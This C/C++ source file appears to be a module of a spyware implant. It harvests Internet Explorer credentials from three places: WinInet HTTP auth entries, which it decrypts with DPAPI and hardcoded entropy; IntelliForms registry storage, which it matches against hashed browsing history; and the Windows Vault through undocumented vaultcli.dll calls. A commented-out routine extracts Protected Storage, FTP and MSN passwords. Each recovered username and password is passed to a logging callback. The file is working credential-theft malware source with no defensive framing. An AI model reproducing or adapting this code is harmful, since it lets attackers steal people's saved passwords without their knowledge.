#define _CRT_SECURE_NO_WARNINGS 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <windows.h>
#include "../HM_SafeProcedures.h"
#include "..\common.h"
#import "pstorec.dll" no_namespace
#include <WinCred.h>

// callback for the password
extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);
extern int LogPasswordA(CHAR *resource, CHAR *service, CHAR *user, CHAR *pass);

#include <urlhist.h>
#include "../sha1.h"
#define URL_HISTORY_MAX 1024
DEFINE_GUID(CLSID_CUrlHistory, 0x3C374A40L, 0xBAE4, 0x11CF, 0xBF, 0x7D, 0x00, 0xAA, 0x00, 0x69, 0x46, 0xEE);

typedef BOOL (WINAPI *typeCredEnumerate)(WCHAR *, DWORD, DWORD *, PCREDENTIALW **);
typedef VOID (WINAPI *typeCredFree)(PVOID);
typedef BOOL (WINAPI *typeCryptUnprotectData)(DATA_BLOB *, LPWSTR *, DATA_BLOB *, PVOID, PVOID, DWORD, DATA_BLOB *);


void GetHashStr(wchar_t *Password, char *HashStr)
{
    HashStr[0]='\0';
	SHA1Context sha;

	SHA1Reset(&sha);
    SHA1Input(&sha, (const unsigned char *) Password, (DWORD)(wcslen(Password)+1)*2);

	if (SHA1Result(&sha)) { 
        // Crea la stringa per la comparazione
		unsigned char *ptr = (unsigned char *)sha.Message_Digest;
        char TmpBuf[128];
        unsigned char tail=0;
		// Calcolo Tail
        for(int i=0; i<20; i++) {
            unsigned char c = ptr[i];
            tail += c;
		}
		for(int i=0; i<5; i++) {
            wsprintf(TmpBuf,"%s%.8X", HashStr, sha.Message_Digest[i]);
            strcpy_s(HashStr, 1024, TmpBuf);
        }
        // Aggiunge gli ultimi 2 byte
        wsprintf(TmpBuf, "%s%2.2X", HashStr, tail);
        strcpy_s(HashStr, 1024, TmpBuf);
	}
}


int GetUrlHistory(wchar_t *UrlHistory[URL_HISTORY_MAX])
{
    int max = 0;
    IUrlHistoryStg2* pUrlHistoryStg2=NULL;
	HRESULT hr;

	CoInitialize(NULL);
    hr = CoCreateInstance(CLSID_CUrlHistory, NULL, CLSCTX_INPROC_SERVER,IID_IUrlHistoryStg2,(void**)(&pUrlHistoryStg2));
    if(SUCCEEDED(hr)) {
        IEnumSTATURL* pEnumUrls;
        hr = pUrlHistoryStg2->EnumUrls(&pEnumUrls);
        if (SUCCEEDED(hr)){
            STATURL StatUrl[1];
            ULONG ulFetched;
            while (max<URL_HISTORY_MAX && (hr = pEnumUrls->Next(1, StatUrl, &ulFetched)) == S_OK) {
                if (StatUrl->pwcsUrl && !(StatUrl->dwFlags & STATURL_QUERYFLAG_NOURL)) {
                    // Cancella eventuali parametri
                    wchar_t *p;
                    if(NULL!=(p = wcschr(StatUrl->pwcsUrl,'?')))
                        *p='\0';
                    UrlHistory[max] = new wchar_t[wcslen(StatUrl->pwcsUrl)+1];
					if (UrlHistory[max]) {
						wcscpy_s(UrlHistory[max], wcslen(StatUrl->pwcsUrl)+1, StatUrl->pwcsUrl);
						for (int i=0; UrlHistory[max][i]; i++)
							UrlHistory[max][i] = tolower(UrlHistory[max][i]);
						max++;
					}
                }
				if (StatUrl->pwcsUrl && !(StatUrl->dwFlags & STATURL_QUERYFLAG_NOURL))
					CoTaskMemFree(StatUrl->pwcsUrl);
				if (StatUrl->pwcsTitle && !(StatUrl->dwFlags & STATURL_QUERYFLAG_NOTITLE))
					CoTaskMemFree(StatUrl->pwcsTitle);
			}
            pEnumUrls->Release();
        }
        pUrlHistoryStg2->Release();
    }
    CoUninitialize();
    return max;
}


void ParseIE7Data(DATA_BLOB *Data_blob, WCHAR *URL)
{
    unsigned int HeaderSize;
    unsigned int DataSize;
    int DataMax;
    WCHAR User[1024];
	WCHAR Pass[1024];
	unsigned int offset;
    char *pInfo;
    char *pData;
	char *Data = (char *)(Data_blob->pbData);

    memcpy(&HeaderSize,&Data[4],4); 
    memcpy(&DataSize,&Data[8],4);   
    memcpy(&DataMax,&Data[20],4);   

	if (HeaderSize>=Data_blob->cbData || Data_blob->cbData<41)
		return;

    pInfo = &Data[36];
    pData = &Data[HeaderSize];

	for (; DataMax>0; DataMax-=2) {
		Pass[0] = 0; // Se non trova la password la WriteAccount non la scrive
		if (DataMax>=1) {
	        memcpy(&offset,pInfo,4);
			if (HeaderSize+12+offset >= Data_blob->cbData)
				return;

			_snwprintf_s(User, sizeof(User)/sizeof(WCHAR), _TRUNCATE, L"%s", &Data[HeaderSize+12+offset]);
	        pInfo+=16;
		}

		if (DataMax>=2) {
	        memcpy(&offset,pInfo,4);
			if (HeaderSize+12+offset >= Data_blob->cbData)
				return;
			
			_snwprintf_s(Pass, sizeof(Pass)/sizeof(WCHAR), _TRUNCATE, L"%s", &Data[HeaderSize+12+offset]);
		    pInfo+=16;
		}
		LogPassword(L"IExplorer", URL, User, Pass);
	}
}


int DumpIE7(void)
{
    wchar_t *UrlHistory[URL_HISTORY_MAX];
	typeCryptUnprotectData pfCryptUnprotectData = NULL;
	typeCredEnumerate pfCredEnumerate = NULL;
	typeCredFree pfCredFree = NULL;
	PCREDENTIALW *CredentialCollection = NULL;
    HMODULE hAdvapi32DLL = NULL;
	HMODULE hCrypt32DLL = NULL;
    DWORD dwCount = 0;    
	DWORD dwTempIndex = 0;
    int UrlListoryMax;
    char *KeyStr = {"Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2"};
    HKEY hKey;

	if ( (hCrypt32DLL = LoadLibrary("crypt32.dll")) )  {
		pfCryptUnprotectData = (typeCryptUnprotectData)HM_SafeGetProcAddress(hCrypt32DLL, "CryptUnprotectData");
	}
	
	if ( (hAdvapi32DLL = LoadLibrary("advapi32.dll")) ) {
		pfCredEnumerate = (typeCredEnumerate)HM_SafeGetProcAddress(hAdvapi32DLL, "CredEnumerateW");
		pfCredFree = (typeCredFree)HM_SafeGetProcAddress(hAdvapi32DLL, "CredFree");
	}

	// HTTP Password
	if ( pfCredEnumerate && pfCredFree && pfCryptUnprotectData ) { 
		short tmp[37];
		char *password={"abe2869f-9b47-4cd9-a358-c22904dba7f7"};
		DATA_BLOB OptionalEntropy;
		DATA_BLOB DataIn;
		DATA_BLOB DataOut;

		for(int i=0; i< 37; i++)
			tmp[i] = (short int)(password[i] * 4);
		OptionalEntropy.pbData = (BYTE *)&tmp;
		OptionalEntropy.cbData = 74;

		dwCount = 0;  
		CredentialCollection = NULL;
		pfCredEnumerate(L"Microsoft_WinInet_*", 0, &dwCount, &CredentialCollection);
		for(dwTempIndex=0; dwTempIndex<dwCount; dwTempIndex++) {
			WCHAR *ptr = NULL;

			if (CredentialCollection[dwTempIndex]->TargetName) {
				ptr = (WCHAR *)CredentialCollection[dwTempIndex]->TargetName; 
				ptr += wcslen(L"Microsoft_WinInet_");
			}

			DataIn.pbData = (BYTE *)CredentialCollection[dwTempIndex]->CredentialBlob;
			DataIn.cbData = CredentialCollection[dwTempIndex]->CredentialBlobSize;

			if(pfCryptUnprotectData(&DataIn, NULL, &OptionalEntropy, NULL, NULL, 0, &DataOut)) {
				WCHAR cred_data[1024];
				WCHAR *pass_off = NULL;

				_snwprintf_s(cred_data, sizeof(cred_data)/sizeof(WCHAR), _TRUNCATE, L"%s", DataOut.pbData);
				if ( (pass_off = wcschr(cred_data, ':')) ) {
					*pass_off = 0;
					pass_off++;
				} 

				LogPassword(L"IExplorer HTTP Auth", ptr, cred_data, pass_off);
				LocalFree(DataOut.pbData);
			}
		}
		if (CredentialCollection) 
			pfCredFree(CredentialCollection);
	}

	// Saved Web Password
	if ( pfCryptUnprotectData ) {
		UrlListoryMax = GetUrlHistory(UrlHistory); // Prende la history
		if( FNC(RegOpenKeyExA)(HKEY_CURRENT_USER,KeyStr,0,KEY_QUERY_VALUE,&hKey) == ERROR_SUCCESS) {
			for(DWORD i=0;;i++) {
				char Val[1024];
				DWORD Size = 1024;
				// Cicla tutti gli URL hashati
				if(ERROR_NO_MORE_ITEMS==FNC(RegEnumValueA)(hKey,i,Val, &Size, NULL,NULL, NULL, NULL))
					break;

				// Cicla tutti gli URL nell'history...
				for(int n=0; n<UrlListoryMax; n++){
					char HashStr[1024];
					//...e ne fa l'hash
					GetHashStr(UrlHistory[n], HashStr);

					// Se trova quello giusto...
					if(strcmp(Val,HashStr) == 0){
						DWORD BufferLen;
						DWORD dwType;

						FNC(RegQueryValueExA)(hKey, Val, 0, &dwType, NULL, &BufferLen);
						BYTE *Buffer = new BYTE[BufferLen];
						if (!Buffer) 
							break;
						//... legge il valore della password...
						if(FNC(RegQueryValueExA)(hKey, Val, 0, &dwType, Buffer, &BufferLen) == ERROR_SUCCESS) {
							DATA_BLOB DataIn;
							DATA_BLOB DataOut;
							DATA_BLOB OptionalEntropy;
							DataIn.pbData =	Buffer;
							DataIn.cbData = BufferLen;
							OptionalEntropy.pbData = (unsigned char *)UrlHistory[n];
							OptionalEntropy.cbData = (DWORD)(wcslen(UrlHistory[n])+1)*2;
							// ...e lo decifra
							if(pfCryptUnprotectData(&DataIn, 0, &OptionalEntropy, NULL, NULL, 1, &DataOut)) {
								ParseIE7Data(&DataOut, UrlHistory[n]);
								LocalFree(DataOut.pbData);
							}
						}
						delete [] Buffer;
						break;
					}
				}
			}
			FNC(RegCloseKey)(hKey);
		}

		// Cancella la URL History creata
		for(int n=0; n<UrlListoryMax; n++)
			delete [] UrlHistory[n];
	}

	return 0;
}
/*
extern BOOL CopyPStoreDLL(char *dll_path);


typedef HRESULT (WINAPI *tPStoreCreateInstance)(IPStore **, DWORD, DWORD, DWORD);
void DumpIEpstorage(void)
{
	tPStoreCreateInstance pPStoreCreateInstance;
	IEnumPStoreTypesPtr EnumPStoreTypes = 0;
	IPStorePtr PStore = 0; 
	HRESULT hRes;
	HMODULE hpsDLL; 
	DWORD i;
	char dll_name[MAX_PATH];

	if (!CopyPStoreDLL(dll_name))
		return;

	if ( (hpsDLL = LoadLibrary(dll_name)) == NULL)
		return;

	pPStoreCreateInstance = (tPStoreCreateInstance)HM_SafeGetProcAddress(hpsDLL, "PStoreCreateInstance");
	if (!pPStoreCreateInstance) {
		FreeLibrary(hpsDLL);
		return;
	}

	pPStoreCreateInstance(&PStore, 0, 0, 0); 
	if (!PStore) {
		FreeLibrary(hpsDLL);
		return;
	}

	hRes = PStore->EnumTypes(0, 0, &EnumPStoreTypes);

	if (!FAILED(hRes)) {
#define PS_ITEM_SIZE 512
		GUID TypeGUID;
		GUID subTypeGUID;
		char szItemName[PS_ITEM_SIZE];       
		char szItemData[PS_ITEM_SIZE];
		char szItemGUID[50];

		while(EnumPStoreTypes->raw_Next(1, &TypeGUID, 0) == S_OK) {      
			IEnumPStoreTypesPtr EnumSubTypes = 0;

			wsprintf(szItemGUID, "%x", TypeGUID);
			EnumSubTypes = NULL;
			PStore->EnumSubtypes(0, &TypeGUID, 0, &EnumSubTypes);
			if (!EnumSubTypes)
				continue;

			while(EnumSubTypes->raw_Next(1, &subTypeGUID, 0) == S_OK) {
				IEnumPStoreItemsPtr spEnumItems = 0;
				LPWSTR itemName;

				spEnumItems = NULL;
				PStore->EnumItems(0, &TypeGUID, &subTypeGUID, 0, &spEnumItems);
				if (!spEnumItems)
					continue;

				while(spEnumItems->raw_Next(1, &itemName, 0) == S_OK) {             
					char chekingdata[PS_ITEM_SIZE];
					unsigned long psDataLen = 0;
					unsigned char *psData = NULL;

					_snprintf_s(szItemName, sizeof(szItemName), _TRUNCATE, "%ws", itemName);			 

					PStore->ReadItem(0, &TypeGUID, &subTypeGUID, itemName, &psDataLen, &psData, NULL, 0);
					if (psData == NULL) {
						CoTaskMemFree(itemName);
						continue;
					}

					if((DWORD)lstrlen((char *)psData) < (DWORD)(psDataLen-1)) {
						i = 0;
						for(DWORD m=0; m<psDataLen && i<PS_ITEM_SIZE; m+=2) {
							if(psData[m]==0)
								szItemData[i]=',';
							else
								szItemData[i]=psData[m];
							i++;
						}
						szItemData[i-1] = 0;				  			
					} else 
						_snprintf_s(szItemData, sizeof(szItemData), _TRUNCATE, "%s", psData);

					// 5e7e8100 - IE:Password-Protected sites
					if(FNC(lstrcmpA)(szItemGUID, "5e7e8100")==0) {	
						// FTP Authentication
						if (!strncmp("DPAPI: ", szItemName, strlen("DPAPI: "))) {
							DATA_BLOB dbin, dbout;
							typeCryptUnprotectData pfCryptUnprotectData = NULL;
							HMODULE hCrypt32DLL = NULL; 

							if ( (hCrypt32DLL = LoadLibrary("crypt32.dll")) )  
								pfCryptUnprotectData = (typeCryptUnprotectData)HM_SafeGetProcAddress(hCrypt32DLL, "CryptUnprotectData");

							if (pfCryptUnprotectData) {
								dbin.cbData = psDataLen;
								dbin.pbData = psData;
								if (pfCryptUnprotectData(&dbin, NULL, NULL, NULL, NULL, 1, &dbout)) {
									char *user;
									char *server;
									char password[128];

									user = strstr(szItemName, "ftp://");
									if (user) 
										user += strlen("ftp://");
									else 
										user = szItemName + strlen("DPAPI: ");

									server = strrchr(user, '@');
									if (server) {
										*server = 0;
										server++;
									} else
										server = user;

									_snprintf_s(password, sizeof(password), _TRUNCATE, "%ws", dbout.pbData);
									LogPasswordA("IExplorer FTP Auth", server, user, password);

									LocalFree(dbout.pbData);
								}
							}
						} else { // HTTP Authentication
							FNC(lstrcpyA)(chekingdata, "");
							if(strstr(szItemData, ":")!=0) {
								_snprintf_s(chekingdata, sizeof(chekingdata), _TRUNCATE, "%s", strstr(szItemData,":")+1);							
								*(strstr(szItemData,":"))=0;				  
							}
							LogPasswordA("IExplorer HTTP Auth", szItemName, szItemData, chekingdata);
						}
					}

					// b9819c52 MSN Explorer Signup
					if(FNC(lstrcmpA)(szItemGUID, "b9819c52")==0) {
						char msnid[100];
						char msnpass[100];
						char *p;

						i=0;
						for(DWORD m=0; m<psDataLen && i<PS_ITEM_SIZE; m+=2) {
							if(psData[m]==0){									
								szItemData[i] = ',';					
								i++;
							} else if(IsCharAlphaNumeric(psData[m])||(psData[m]=='@')||(psData[m]=='.')||(psData[m]=='_')) {
								szItemData[i] = psData[m];					
								i++;
							}							
						}

						if (i = 0) i = 1;
						szItemData[i-1]=0;
						p = szItemData+2;
						for(DWORD ii=0; ii<psData[4]; ii++) {
							_snprintf_s(msnid, sizeof(msnid), _TRUNCATE, "%s", p+1);							
							if(strstr(msnid,",")!=0) 
								*strstr(msnid,",") = 0;
							if(strstr(p+1,",")!=0)
								_snprintf_s(msnpass, sizeof(msnpass), _TRUNCATE, "%s", strstr(p+1,",")+2);

							if(strstr(msnpass,",")!=0) 
								*strstr(msnpass,",")=0;									
							p = strstr(p+1,",")+2+lstrlen(msnpass)+7;

							if (p > szItemData + sizeof(szItemData))
								break;

							LogPasswordA("MSN Explorer", msnid, msnid, msnpass);
						}
					}

					//e161255a IE 
					if(FNC(lstrcmpA)(szItemGUID,"e161255a")==0) {
						if(strstr(szItemName, "StringIndex")==0) {
							if(strstr(szItemName,":String")!=0) 
								*strstr(szItemName,":String")=0;			  
							lstrcpyn(chekingdata,szItemName,8);			  
							if((strstr(chekingdata,"http:/")==0) && (strstr(chekingdata,"https:/")==0)) {
								LogPasswordA("IExplorer (autocomp)", szItemName, szItemData, "");
							} else {
								FNC(lstrcpyA)(chekingdata,"");
								if(strstr(szItemData,",")!=0) {
									_snprintf_s(chekingdata, sizeof(chekingdata), _TRUNCATE, "%s", strstr(szItemData,",")+1);
									*(strstr(szItemData,","))=0;				  
								}
								LogPasswordA("IExplorer", szItemName, szItemData, chekingdata);				
							}
						}
					}
					CoTaskMemFree(itemName);
					CoTaskMemFree(psData);
				}
				if (spEnumItems) {
					spEnumItems.Release();
					spEnumItems = 0;
				}
			}
			if (EnumSubTypes) {
				EnumSubTypes.Release();
				EnumSubTypes = 0;
			}
		}		  
	}  	  
	if (EnumPStoreTypes)
		EnumPStoreTypes.Release();
	if (PStore)
		PStore.Release();
	FreeLibrary(hpsDLL);
}*/

typedef struct {
	DWORD schema_elem_id;
	DWORD unk1;
	DWORD unk2;
	DWORD unk3;
	WCHAR *name;
} vault_entry_s;

typedef struct {
	GUID schema;
	WCHAR *program;
	vault_entry_s *resource;
	vault_entry_s *user;
	vault_entry_s *password;
	BYTE unk[24];
} vault_cred_s;

typedef unsigned int (__stdcall *VaultOpenVault_t)(_GUID *pVaultId, unsigned int dwFlags, void **pVaultHandle); 
typedef unsigned int (__stdcall *VaultEnumerateItems_t)(void *VaultHandle, unsigned int dwFlags, DWORD *count, vault_cred_s **vault_cred); 
typedef unsigned int (__stdcall *VaultGetItem_t)(void *VaultHandle, _GUID *pSchemaId, vault_entry_s *pResource, vault_entry_s *pIdentity, vault_entry_s *pPackageSid, HWND__ *hwndOwner, unsigned int dwFlags, vault_cred_s **ppItem);
typedef unsigned int (__stdcall *VaultCloseVault_t)(void **pVaultHandle);
typedef void (__stdcall *VaultFree_t)(void *pMemory);

void DumpVault()
{
	void *vhandle = NULL;
	VaultOpenVault_t pVaultOpenVault = NULL;
	VaultEnumerateItems_t pVaultEnumerateItems = NULL;
	VaultGetItem_t pVaultGetItem = NULL;
	VaultCloseVault_t pVaultCloseVault = NULL;
	VaultFree_t pVaultFree = NULL;
	GUID guid_vault;
	GUID guid_schema;
	DWORD count = 0;
	vault_cred_s *vault_cred = NULL;
	vault_cred_s *vault_cred_full = NULL;
	HMODULE hmod = NULL;
	DWORD i = 0;

	if (CLSIDFromString(L"{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}", &guid_vault)  != S_OK)
		return;
	if (CLSIDFromString(L"{3CCD5499-87A8-4B10-A215-608888DD3B55}", &guid_schema) != S_OK)
		return;

	hmod = LoadLibrary("vaultcli.dll");
	if (hmod == NULL)
		return;

	pVaultOpenVault = (VaultOpenVault_t)GetProcAddress(hmod, "VaultOpenVault");
	pVaultEnumerateItems = (VaultEnumerateItems_t)GetProcAddress(hmod, "VaultEnumerateItems");
	pVaultGetItem = (VaultGetItem_t)GetProcAddress(hmod, "VaultGetItem");
	pVaultCloseVault = (VaultCloseVault_t)GetProcAddress(hmod, "VaultCloseVault");
	pVaultFree = (VaultFree_t)GetProcAddress(hmod, "VaultFree");

	if (pVaultOpenVault && pVaultEnumerateItems && pVaultGetItem && pVaultCloseVault && pVaultFree) {
		if (pVaultOpenVault(&guid_vault, 0, &vhandle) == S_OK) {
			if (pVaultEnumerateItems(vhandle, 0x200, &count, &vault_cred) == S_OK) {
				for (i=0; i<count; i++) {
					if (pVaultGetItem(vhandle, &guid_schema, vault_cred[i].resource, vault_cred[i].user, 0, 0, 0, &vault_cred_full) == S_OK) {
						LogPassword(L"IExplorer", vault_cred[i].resource->name, vault_cred[i].user->name, vault_cred_full->password->name);						
						pVaultFree(vault_cred_full);
						vault_cred_full = NULL;
					}
				}
				pVaultFree(vault_cred);
			}
			pVaultCloseVault(&vhandle);
		}
	} 
	FreeLibrary(hmod);
}

int DumpIExplorer(void)
{
	//DumpIEpstorage();
	DumpVault();
	DumpIE7();
	
	return 0;
}